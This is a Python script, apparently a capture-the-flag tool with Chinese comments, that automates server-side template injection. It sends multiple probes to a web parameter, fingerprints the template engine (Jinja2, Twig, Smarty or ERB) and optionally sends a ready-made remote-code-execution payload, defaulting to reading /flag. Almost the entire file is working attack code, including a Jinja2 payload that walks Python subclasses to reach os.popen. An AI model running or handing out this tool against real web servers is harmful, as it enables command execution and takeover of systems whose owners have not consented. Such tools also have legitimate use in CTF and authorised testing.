#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: SSTI 多引擎探测一把梭 —— 一次投递多组探针({{7*7}}/${7*7}/<%=7*7%>/#{7*7} 等),
     按回显数值判定模板引擎, 再给出对应引擎的 RCE payload 并可直接发送
适用条件:
    - 参数被模板引擎渲染(页面回显中出现 49/7777742 等计算结果)
    - 支持 Jinja2 / Twig / Smarty / ERB(Ruby), 其他引擎按注释扩展
用法:
    python web_ssti_probe.py -u http://t/hello -p name            # 只探测判引擎
    python web_ssti_probe.py -u http://t/hello -p name --rce      # 探测后自动打 RCE
    python web_ssti_probe.py -u ... -p name -m post -d "user=admin"  # POST 传参
"""
import argparse
import re
import requests

# 探针 -> (特征值, 引擎判定). 一个探针命中多个引擎时按引擎专属探针二次确认
PROBES = {
    "{{7*7}}": "49",            # Jinja2 / Twig
    "{{7*'7'}}": "7777777",     # 7777777=Jinja2, 49=Twig(乘法语义不同, 用于二分)
    "${7*7}": "49",             # Twig / Smarty / Freemarker / Thymeleaf
    "<%= 7*7 %>": "49",         # ERB / EJS
    "#{7*7}": "49",             # Ruby / Thymeleaf 变体
    "{7*7}": "49",              # Smarty (math 标签)
}

# 各引擎 RCE payload(占位 CMD 由 --cmd 填充)
RCE_PAYLOADS = {
    "Jinja2": (
        "{% for c in [].__class__.__base__.__subclasses__() %}"
        "{% if c.__name__=='catch_warnings' %}"
        "{{ c.__init__.__globals__['__builtins__'].eval("
        "\"__import__('os').popen('{cmd}').read()\") }}"
        "{% endif %}{% endfor %}"                       # 通用版: 遍历子类找 catch_warnings
    ),
    "Twig": (
        "{{['{cmd}']|map('system')}}"                   # Twig >= 2.x filter 注入
        # 备选: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
    ),
    "Smarty": (
        "{system('cmd')}"                               # Smarty3 标签直接执行(安全策略宽松时)
        # 备选: {Smarty_Internal_Write_File::writeFile($x,"<?php system('cmd');?>",self)}
    ),
    "ERB": "<%= `cmd` %>",                              # Ruby ERB 反引号
}


def render(sess, url, param, value, method, data):
    """按 GET/POST 投递单个探针, 返回响应文本"""
    if method == "post":
        payload = dict(kv.split("=", 1) for kv in data.split("&") if kv) if data else {}
        payload[param] = value
        return sess.post(url, data=payload, timeout=10).text
    return sess.get(url, params={param: value}, timeout=10).text


def probe(url, param, method, data, proxy):
    """依次投递探针, 命中特征值则记录; 判定引擎: {{7*7}} 与 {{7*'7'}} 组合二分"""
    sess = requests.Session()
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    baseline = render(sess, url, param, "zZprobezZ", method, data)
    hits = []
    for probe_str, expect in PROBES.items():
        try:
            resp = render(sess, url, param, probe_str, method, data)
        except requests.RequestException as e:
            print(f"[!] 请求失败 {probe_str}: {e}")
            continue
        if expect in resp and expect not in baseline:
            hits.append((probe_str, expect))
            print(f"[+] 命中: {probe_str!r} -> {expect}")
    # 引擎判定: 49=Jinja2/Twig/ERB, 再看 {{7*'7'}}: 7777777=Jinja2, 否则看 ${7*7} 等
    hit_map = dict(hits)
    if hit_map.get("{{7*7}}") == "49":
        engine = "Jinja2" if hit_map.get("{{7*'7'}}") == "7777777" else (
            "Twig" if "${7*7}" in hit_map else None)
        if engine is None and "<%= 7*7 %>" in hit_map:
            engine = "ERB"
    elif "${7*7}" in hit_map:
        engine = "Smarty" if "{7*7}" in hit_map else "Twig"
    elif "<%= 7*7 %>" in hit_map:
        engine = "ERB"
    else:
        engine = None
    print(f"[*] 判定引擎: {engine or '未知(换探针/看报错指纹)'}")
    return engine, sess


def main():
    ap = argparse.ArgumentParser(description="SSTI 多引擎探测 + RCE")
    ap.add_argument("-u", "--url", required=True, help="渲染点 URL")
    ap.add_argument("-p", "--param", required=True, help="注入参数名")
    ap.add_argument("-m", "--method", choices=["get", "post"], default="get")
    ap.add_argument("-d", "--data", default="", help="POST 附加参数 k1=v1&k2=v2")
    ap.add_argument("--cmd", default="cat /flag", help="RCE 命令")
    ap.add_argument("--rce", action="store_true", help="判定引擎后自动发 RCE payload")
    ap.add_argument("--proxy", help="代理 http://127.0.0.1:8080")
    args = ap.parse_args()

    engine, sess = probe(args.url, args.param, args.method, args.data, args.proxy)
    if args.rce and engine:
        payload = RCE_PAYLOADS[engine].replace("{cmd}", args.cmd)
        print(f"[*] 发送 {engine} RCE payload:\n{payload}\n")
        if args.method == "post":
            body = dict(kv.split("=", 1) for kv in args.data.split("&") if kv)
            body[args.param] = payload
            resp = sess.post(args.url, data=body, timeout=10)
        else:
            resp = sess.get(args.url, params={args.param: payload}, timeout=10)
        flags = re.findall(r"flag\{.*?\}|CTF\{.*?\}", resp.text)
        print("[+] 疑似 flag:", flags) if flags else print(resp.text[:2000])


if __name__ == "__main__":
    main()
